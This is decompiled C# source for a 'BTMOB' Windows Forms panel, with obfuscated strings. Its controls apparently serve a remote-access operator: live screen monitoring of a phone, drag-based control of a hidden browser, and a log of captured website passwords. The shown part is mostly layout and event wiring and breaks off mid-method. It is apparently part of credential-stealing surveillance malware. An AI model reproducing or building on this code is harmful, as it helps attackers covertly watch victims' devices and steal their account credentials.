using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class WebBrowser : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("combotyps")]
	private DrakeUIComboBox _combotyps;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("combositespass")]
	private DrakeUIComboBox _combositespass;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viewhidden")]
	private PictureBox _viewhidden;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("urlinputhiden")]
	private DrakeUITextBox _urlinputhiden;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("inputtext")]
	private DrakeUITextBox _inputtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("stophdbbtn")]
	private DrakeUIButtonIcon _stophdbbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selcthtmlbtn")]
	private DrakeUIButtonIcon _selcthtmlbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("strtmonitor")]
	private DrakeUIButtonIcon _strtmonitor;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clractlog")]
	private DrakeUIButtonIcon _clractlog;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refpasses")]
	private DrakeUIButtonIcon _refpasses;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("dellall")]
	private DrakeUIButtonIcon _dellall;

	public BTClient Btcli;

	public Dictionary<string, string> SiteData;

	private bool HB_isDown;

	private bool HB_isClick;

	private List<Point> HB_trackPoints;

	private int HB_startX;

	private int HB_startY;

	private const int HBdragThreshold = 5;

	private const int targetWidth = 720;

	private const int targetHeight = 1280;

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox combotyps
	{
		[CompilerGenerated]
		get
		{
			return _combotyps;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboqultz_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _combotyps;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_combotyps = value;
			drakeUIComboBox = _combotyps;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("maintabs")]
	internal virtual DrakeUITabControl maintabs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage3")]
	internal virtual TabPage TabPage3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("monitorinput")]
	internal virtual DrakeUITextBox monitorinput
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("viewmonitor")]
	internal virtual PictureBox viewmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("passtextlog")]
	internal virtual RichTextBox passtextlog
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox combositespass
	{
		[CompilerGenerated]
		get
		{
			return _combositespass;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = combositespass_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _combositespass;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_combositespass = value;
			drakeUIComboBox = _combositespass;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual PictureBox viewhidden
	{
		[CompilerGenerated]
		get
		{
			return _viewhidden;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = viewhidden_MouseDown;
			MouseEventHandler value3 = viewhidden_MouseMove;
			MouseEventHandler value4 = viewhidden_MouseUp;
			PictureBox pictureBox = _viewhidden;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
				pictureBox.MouseMove -= value3;
				pictureBox.MouseUp -= value4;
			}
			_viewhidden = value;
			pictureBox = _viewhidden;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
				pictureBox.MouseMove += value3;
				pictureBox.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon5_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon5 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUITextBox urlinputhiden
	{
		[CompilerGenerated]
		get
		{
			return _urlinputhiden;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = DrakeUITextBox1_KeyDown;
			DrakeUITextBox drakeUITextBox = _urlinputhiden;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown -= value2;
			}
			_urlinputhiden = value;
			drakeUITextBox = _urlinputhiden;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown += value2;
			}
		}
	}

	internal virtual DrakeUITextBox inputtext
	{
		[CompilerGenerated]
		get
		{
			return _inputtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = inputtext_KeyDown;
			DrakeUITextBox drakeUITextBox = _inputtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown -= value2;
			}
			_inputtext = value;
			drakeUITextBox = _inputtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.KeyDown += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon stophdbbtn
	{
		[CompilerGenerated]
		get
		{
			return _stophdbbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = stophdbbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _stophdbbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_stophdbbtn = value;
			drakeUIButtonIcon = _stophdbbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon selcthtmlbtn
	{
		[CompilerGenerated]
		get
		{
			return _selcthtmlbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = selcthtmlbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _selcthtmlbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_selcthtmlbtn = value;
			drakeUIButtonIcon = _selcthtmlbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon strtmonitor
	{
		[CompilerGenerated]
		get
		{
			return _strtmonitor;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = strtmonitor_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _strtmonitor;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_strtmonitor = value;
			drakeUIButtonIcon = _strtmonitor;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon clractlog
	{
		[CompilerGenerated]
		get
		{
			return _clractlog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = clractlog_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _clractlog;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_clractlog = value;
			drakeUIButtonIcon = _clractlog;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon refpasses
	{
		[CompilerGenerated]
		get
		{
			return _refpasses;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = refpasses_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _refpasses;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_refpasses = value;
			drakeUIButtonIcon = _refpasses;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon dellall
	{
		[CompilerGenerated]
		get
		{
			return _dellall;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = dellall_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _dellall;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_dellall = value;
			drakeUIButtonIcon = _dellall;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public WebBrowser()
	{
		base.Load += WebBrowser_Load;
		SiteData = new Dictionary<string, string>();
		HB_isDown = false;
		HB_isClick = false;
		HB_trackPoints = new List<Point>();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.WebBrowser));
		this.Panel3 = new System.Windows.Forms.Panel();
		this.selcthtmlbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.combotyps = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.monitorinput = new DrakeUI.Framework.DrakeUITextBox();
		this.strtmonitor = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.maintabs = new DrakeUI.Framework.DrakeUITabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.viewmonitor = new System.Windows.Forms.PictureBox();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.viewhidden = new System.Windows.Forms.PictureBox();
		this.inputtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.urlinputhiden = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeUIButtonIcon5 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.stophdbbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.passtextlog = new System.Windows.Forms.RichTextBox();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.combositespass = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.dellall = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.clractlog = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.refpasses = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Panel5 = new System.Windows.Forms.Panel();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.maintabs.SuspendLayout();
		this.TabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viewmonitor).BeginInit();
		this.TabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viewhidden).BeginInit();
		this.Panel9.SuspendLayout();
		this.TabPage3.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel5.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(582, 5);
		this.minibtn.Location = new System.Drawing.Point(624, 5);
		this.closbtn.Location = new System.Drawing.Point(666, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(698, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(708, 26);
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.selcthtmlbtn);
		this.Panel3.Controls.Add(this.combotyps);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(0, 0);
		this.Panel3.Name = EXGuarder._0C364E4E;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(690, 50);
		this.Panel3.TabIndex = 40;
		this.selcthtmlbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.selcthtmlbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.selcthtmlbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.selcthtmlbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selcthtmlbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.selcthtmlbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selcthtmlbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selcthtmlbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selcthtmlbtn.Font = new System.Drawing.Font(EXGuarder._046E101C, 10f);
		this.selcthtmlbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.selcthtmlbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.selcthtmlbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.selcthtmlbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.selcthtmlbtn.Location = new System.Drawing.Point(559, 9);
		this.selcthtmlbtn.Name = EXGuarder._335F1F5D;
		this.selcthtmlbtn.Radius = 15;
		this.selcthtmlbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.selcthtmlbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.selcthtmlbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.selcthtmlbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.selcthtmlbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.selcthtmlbtn.Size = new System.Drawing.Size(122, 32);
		this.selcthtmlbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.selcthtmlbtn.Symbol = 61787;
		this.selcthtmlbtn.SymbolSize = 20;
		this.selcthtmlbtn.TabIndex = 46;
		this.selcthtmlbtn.Text = EXGuarder._4B731170;
		this.combotyps.Dock = System.Windows.Forms.DockStyle.Left;
		this.combotyps.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combotyps.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combotyps.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.combotyps.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.combotyps.Items.AddRange(new object[2]
		{
			EXGuarder._090C2955,
			EXGuarder._6C01591F
		});
		this.combotyps.Location = new System.Drawing.Point(9, 9);
		this.combotyps.Margin = new System.Windows.Forms.Padding(4);
		this.combotyps.MinimumSize = new System.Drawing.Size(56, 0);
		this.combotyps.Name = EXGuarder._135A215D;
		this.combotyps.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combotyps.Radius = 15;
		this.combotyps.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combotyps.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combotyps.Size = new System.Drawing.Size(148, 25);
		this.combotyps.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combotyps.TabIndex = 44;
		this.combotyps.Text = EXGuarder._090C2955;
		this.combotyps.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel4.Controls.Add(this.monitorinput);
		this.Panel4.Controls.Add(this.strtmonitor);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel4.Location = new System.Drawing.Point(0, 50);
		this.Panel4.Name = EXGuarder._6F6C1A55;
		this.Panel4.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.Panel4.Size = new System.Drawing.Size(690, 39);
		this.Panel4.TabIndex = 46;
		this.Panel4.Controls.SetChildIndex(this.strtmonitor, 0);
		this.Panel4.Controls.SetChildIndex(this.monitorinput, 0);
		this.monitorinput.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.monitorinput.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.monitorinput.Dock = System.Windows.Forms.DockStyle.Fill;
		this.monitorinput.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.monitorinput.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.monitorinput.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.monitorinput.ForeColor = System.Drawing.Color.White;
		this.monitorinput.Location = new System.Drawing.Point(140, 7);
		this.monitorinput.Margin = new System.Windows.Forms.Padding(4);
		this.monitorinput.Maximum = 2147483647.0;
		this.monitorinput.Minimum = -2147483648.0;
		this.monitorinput.Name = EXGuarder._521C2B50;
		this.monitorinput.Padding = new System.Windows.Forms.Padding(4);
		this.monitorinput.Radius = 15;
		this.monitorinput.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.monitorinput.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.monitorinput.Size = new System.Drawing.Size(542, 25);
		this.monitorinput.Style = DrakeUI.Framework.UIStyle.Custom;
		this.monitorinput.TabIndex = 31;
		this.monitorinput.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.monitorinput.Watermark = EXGuarder._3739552B;
		this.strtmonitor.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.strtmonitor.Cursor = System.Windows.Forms.Cursors.Hand;
		this.strtmonitor.Dock = System.Windows.Forms.DockStyle.Left;
		this.strtmonitor.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.strtmonitor.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.strtmonitor.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.strtmonitor.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.strtmonitor.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.strtmonitor.Font = new System.Drawing.Font(EXGuarder._046E101C, 10f);
		this.strtmonitor.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.strtmonitor.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.strtmonitor.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.strtmonitor.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.strtmonitor.Location = new System.Drawing.Point(8, 7);
		this.strtmonitor.Name = EXGuarder._6660641E;
		this.strtmonitor.Radius = 15;
		this.strtmonitor.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.strtmonitor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.strtmonitor.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.strtmonitor.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.strtmonitor.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.strtmonitor.Size = new System.Drawing.Size(122, 25);
		this.strtmonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.strtmonitor.Symbol = 61912;
		this.strtmonitor.SymbolSize = 20;
		this.strtmonitor.TabIndex = 47;
		this.strtmonitor.Text = EXGuarder._36066B0A;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(130, 7);
		this.DrakeWidth_W2.Name = EXGuarder._5C0B041C;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(27, 25);
		this.DrakeWidth_W2.TabIndex = 53;
		this.maintabs.Controls.Add(this.TabPage1);
		this.maintabs.Controls.Add(this.TabPage2);
		this.maintabs.Controls.Add(this.TabPage3);
		this.maintabs.Dock = System.Windows.Forms.DockStyle.Fill;
		this.maintabs.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.maintabs.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.maintabs.Font = new System.Drawing.Font(EXGuarder._046E101C, 9f);
		this.maintabs.ItemSize = new System.Drawing.Size(150, 40);
		this.maintabs.Location = new System.Drawing.Point(9, 9);
		this.maintabs.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.maintabs.Name = EXGuarder._6E430703;
		this.maintabs.SelectedIndex = 0;
		this.maintabs.Size = new System.Drawing.Size(690, 906);
		this.maintabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.maintabs.Style = DrakeUI.Framework.UIStyle.Custom;
		this.maintabs.StyleCustomMode = true;
		this.maintabs.TabBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.maintabs.TabIndex = 46;
		this.maintabs.TabSelectedColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.maintabs.TabSelectedForeColor = System.Drawing.Color.White;
		this.maintabs.TabSelectedHighColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.maintabs.TabUnSelectedForeColor = System.Drawing.Color.FromArgb(240, 240, 240);
		this.TabPage1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage1.Controls.Add(this.viewmonitor);
		this.TabPage1.Controls.Add(this.Panel4);
		this.TabPage1.Controls.Add(this.Panel3);
		this.TabPage1.Location = new System.Drawing.Point(0, 40);
		this.TabPage1.Name = EXGuarder._2D491940;
		this.TabPage1.Size = new System.Drawing.Size(690, 866);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = EXGuarder._3E550C16;
		this.viewmonitor.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.viewmonitor.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewmonitor.Location = new System.Drawing.Point(0, 89);
		this.viewmonitor.Name = EXGuarder._496D216E;
		this.viewmonitor.Size = new System.Drawing.Size(690, 777);
		this.viewmonitor.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.viewmonitor.TabIndex = 41;
		this.viewmonitor.TabStop = false;
		this.TabPage2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage2.Controls.Add(this.viewhidden);
		this.TabPage2.Controls.Add(this.inputtext);
		this.TabPage2.Controls.Add(this.Panel9);
		this.TabPage2.Location = new System.Drawing.Point(0, 40);
		this.TabPage2.Name = EXGuarder._1F0F3F59;
		this.TabPage2.Size = new System.Drawing.Size(690, 866);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = EXGuarder._69644B14;
		this.viewhidden.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.viewhidden.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewhidden.Location = new System.Drawing.Point(0, 48);
		this.viewhidden.Name = EXGuarder._40667871;
		this.viewhidden.Size = new System.Drawing.Size(690, 793);
		this.viewhidden.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
